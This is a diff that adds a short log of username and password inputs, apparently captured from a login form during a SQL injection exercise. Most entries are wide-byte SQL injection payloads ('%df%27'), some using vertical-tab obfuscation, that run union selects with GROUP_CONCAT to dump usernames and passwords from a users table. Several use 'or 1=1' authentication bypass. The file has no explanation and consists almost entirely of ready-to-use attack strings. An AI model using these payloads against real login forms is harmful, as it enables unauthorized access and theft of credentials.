@@ -1,0 +1,31 @@
+User Name:adminPassword:a
+User Name:adminPassword:1
+User Name:adminPassword:a
+User Name:admin%df%27Password:
+User Name:admin%df%27Password:
+User Name:admin%df%27union%0bselect%0b1,(SELECT%0bGROUP_CONCAT(username,password%0bSEPARATOR%0b0x3c62723e)%0bFROM%0busers),3%0band%0b'1'='1Password:
+User Name:%df%27union%0bselect%0b1,(SELECT%0bGROUP_CONCAT(username,password%0bSEPARATOR%0b0x3c62723e)%0bFROM%0busers),3%0band%0b'1'='1Password:
+User Name:%df'%0bunion%0bselect%0b1,(SELECT%0bGROUP_CONCAT(username,password%0bSEPARATOR%0b0x3c62723e)%0bFROM%0busers)%0band%0b'1'='1Password:
+User Name:%df%27%0bunion%0bselect%0b1,(SELECT%0bGROUP_CONCAT(username,password%0bSEPARATOR%0b0x3c62723e)%0bFROM%0busers)--+Password:
+User Name:%df%27%0bunion%0bselect%0b1,(SELECT%0bGROUP_CONCAT(username,password%0bSEPARATOR%0b0x3c62723e)%0bFROM%0busers)--+Password:123
+User Name:%df%27 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)--+#Password:
+User Name:%df%27 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)--+#Password:
+User Name:%df%27 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)--+#Password:
+User Name:%df%27 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)--+#Password:
+User Name:adminPassword:1
+User Name:admin%df' union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#Password:
+User Name:adminPassword:1
+User Name:adminPassword:1
+User Name:adminPassword:1
+User Name:ß'unionselect1,(SELECTGROUP_CONCAT(username,passwordSEPARATOR0x3c62723e)FROMusers)-- #Password:1
+User Name:%df%27%0bunion%0bselect%0b1,(SELECT%0bGROUP_CONCAT(username,password%0bSEPARATOR%0b0x3c62723e)%0bFROM%0busers)--+#Password:1
+User Name:"Password:
+User Name:%df"Password:
+User Name:%df" "Password:
+User Name:%df" "--#Password:
+User Name:%df%27%0bunion%0bselect%0b1,(SELECT%0bGROUP_CONCAT(username,password%0bSEPARATOR%0b0x3c62723e)%0bFROM%0busers)--+#Password:
+User Name:%df' or 1=1#Password:k
+User Name:%df' or 1=1 -- #Password:
+User Name:adminPassword:1
+User Name:%df' or 1=1 -- #Password:
+User Name:ß' or 1=1 -- Password:1
